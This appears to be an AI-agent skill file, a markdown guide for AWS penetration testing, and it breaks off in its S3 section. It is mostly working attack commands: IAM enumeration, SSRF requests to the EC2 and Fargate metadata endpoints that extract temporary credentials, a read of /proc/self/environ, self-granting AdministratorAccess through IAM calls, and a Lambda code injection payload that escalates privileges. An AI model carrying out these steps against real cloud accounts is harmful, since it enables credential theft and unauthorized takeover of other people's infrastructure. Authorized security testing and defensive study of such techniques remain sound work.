---
name: AWS Penetration Testing
description: This skill should be used when the user asks to "pentest AWS", "test AWS security", "enumerate IAM", "exploit cloud infrastructure", "AWS privilege escalation", "S3 bucket testing", "metadata SSRF", "
category: Security & Systems
source: antigravity
tags: [python, api, ai, agent, workflow, document, security, pentest, vulnerability, aws]
url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/aws-penetration-testing
---


# AWS Penetration Testing

## Purpose

Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.

## Inputs/Prerequisites

- AWS CLI configured with credentials
- Valid AWS credentials (even low-privilege)
- Understanding of AWS IAM model
- Python 3, boto3 library
- Tools: Pacu, Prowler, ScoutSuite, SkyArk

## Outputs/Deliverables

- IAM privilege escalation paths
- Extracted credentials and secrets
- Compromised EC2/Lambda/S3 resources
- Persistence mechanisms
- Security audit findings

---

## Essential Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | Shadow Admin discovery | `Import-Module .\SkyArk.ps1` |
| Prowler | Security auditing | `pip install prowler` |
| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |
| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | IAM analysis | `pip install principalmapper` |

---

## Core Workflow

### Step 1: Initial Enumeration

Identify the compromised identity and permissions:

```bash
# Check current identity
aws sts get-caller-identity

# Configure profile
aws configure --profile compromised

# List access keys
aws iam list-access-keys

# Enumerate permissions
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Step 2: IAM Enumeration

```bash
# List all users
aws iam list-users

# List groups for user
aws iam list-groups-for-user --user-name TARGET_USER

# List attached policies
aws iam list-attached-user-policies --user-name TARGET_USER

# List inline policies
aws iam list-user-policies --user-name TARGET_USER

# Get policy details
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# List roles
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Step 3: Metadata SSRF (EC2)

Exploit SSRF to access metadata endpoint (IMDSv1):

```bash
# Access metadata endpoint
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**For IMDSv2 (token required):**

```bash
# Get token first
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Use token for requests
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate Container Credentials:**

```bash
# Read environment for credential path
/proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Access credentials
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Privilege Escalation Techniques

### Shadow Admin Permissions

These permissions are equivalent to administrator:

| Permission | Exploitation |
|------------|--------------|
| `iam:CreateAccessKey` | Create keys for admin user |
| `iam:CreateLoginProfile` | Set password for any user |
| `iam:AttachUserPolicy` | Attach admin policy to self |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:UpdateFunctionCode` | Inject code into Lambda |

### Create Access Key for Another User

```bash
aws iam create-access-key --user-name target_user
```

### Attach Admin Policy

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Add Inline Admin Policy

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Lambda Privilege Escalation

```python
# code.py - Inject into Lambda function
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Update Lambda code
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## S3 Bucket Exploitation

### Bucket Discovery

```bash
# Using bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Common bucket URL patterns
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Bucket Enumeration
